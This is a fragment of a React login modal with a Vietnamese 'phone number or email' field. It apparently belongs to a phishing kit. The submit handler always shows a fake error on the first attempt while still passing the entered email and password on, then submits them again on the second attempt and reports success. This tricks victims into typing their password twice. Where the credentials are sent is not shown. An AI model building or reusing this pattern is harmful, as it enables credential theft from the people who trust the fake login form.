...
const LoginModal = ({ show, onSubmit, onSuccess, texts }) => {
    ...
    const handleSubmit = async (e) => {
        ...
        setTimeout(() => {
            ...
            if (loginAttempt === 0) {
                setShowError(true);
                setLoginAttempt(1);
                onSubmit(email, formData.password);
            } else {
                setShowError(false);
                onSubmit(email, formData.password);
                onSuccess();
    ...
    const getInputWrapperStyle = (isInvalid = false) => ({
        position: 'relative',
        width: '100%',
        height: '40px',
        border: `1.5px solid ${isInvalid ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        transition: 'all 0.2s',
        marginBottom: isInvalid ? '4px' : '10px',
    });
                    ...
                    <form autoComplete="off" onSubmit={handleSubmit}>
                        ...
                        >
                            <input
                                style={inputStyle}
                                type="text"
                                placeholder={texts.mobileOrEmail || 'Số điện thoại hoặc email'}
                        ...
                        <div
                            className="login-input-wrapper"
                            style={getInputWrapperStyle(showError)}
                        >
                            <input
                                style={inputStyle}
